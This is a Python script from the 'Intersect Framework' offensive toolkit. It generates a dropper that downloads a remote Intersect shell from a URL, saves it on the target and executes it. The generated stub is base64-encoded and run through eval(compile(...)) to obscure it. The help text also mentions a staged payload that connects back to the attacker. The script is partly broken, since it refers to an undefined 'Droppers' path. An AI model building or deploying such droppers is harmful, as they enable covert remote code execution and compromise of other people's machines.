#!/usr/bin/python
# Intersect Framework (c) 2012
# Simple web download-exec Intersect dropper
# dl's a remote Intersect shell, saves and executes


import os, sys
import argparse
from src import core
from src import encode
import base64

New_Payloads = ("Scripts/Payloads/") 
Payload_Templates = ("src/Templates/Payloads")
 
help = """Generate an Intersect payload. The 'webdl' option will fetch an Intersect
shell from a URL, download onto the target and execute. The 'staged' payload will,
once executed, connect back to the attackers system, download an Intersect shell and
then execute. Make sure you start a handler for the staged method before using it."""

parser = argparse.ArgumentParser(description=help, prog="payloads")
parser.add_argument("--type", help="payload to generate", choices=["webdl", "staged"], required=True)
parser.add_argument("--host", help="local host/IP address")
parser.add_argument("--port", help="local port number", type=int)
parser.add_argument("--enc", help="encoding selection", choices=["b64", "xor"])
parser.add_argument("--url", help="url download path - webdl")
parser.add_argument("--file", help="remote filename - webdl")
parser.add_argument("--loc", help="remote location - webdl")
parser.add_argument("--handler", help="autostart staged handler", action="store")
args = parser.parse_args()

url = args.url
fname = args.file
loc = args.loc

if loc.endswith("/"):
    rpath = (loc+fname)
else:
    rpath = (loc+"/"+fname)

os.system("clear")
print("\n[*] Generating Intersect dropper with the following options: ")
print("  Download URL => %s" % url)
print("  Download Location => %s" % rpath)
print("  Local Filename => Scripts/Droppers/%s" % fname )

plaintext =("""u = urllib2.urlopen('%s')
if os.path.exists('%s') is False:
    os.mkdir('%s')
fin = open('%s', 'w')
fin.write(u.read())
fin.close()
if os.path.exists('%s'):
    subprocess.call(['python', '%s'])
""" % (url, loc, loc, rpath, rpath, rpath))

encode = base64.b64encode(plaintext)
#print("Base64 Encoded Dropper:\n %s" % encode)


try:
    fout = open(Droppers+fname, "w")
    fout.write("#!/usr/bin/python")
    fout.write("\nimport urllib2")
    fout.write("\nimport os, sys")
    fout.write("\nimport subprocess")
    fout.write("\nimport base64")
    fout.write("\n\nchunk = '%s'" % encode)
    fout.write("\nbuild = base64.b64decode(chunk)")
    fout.write("\neval(compile(build,'<string>', 'exec'))")
    fout.close()    
except:
    print("\n[!] Error writing %s to %s directory!" % (fname, Droppers))
    print("    Make sure you have the correct permissions.")
    sys.exit(0)

if os.path.exists(Droppers+fname):
    print("\n[*] Intersect dropper built!")
    print("    Location: Scripts/Droppers/%s" % fname)
else:
    print("\n[!] Something went wrong!")
    print("    New dropper did not save correctly. Try again.")
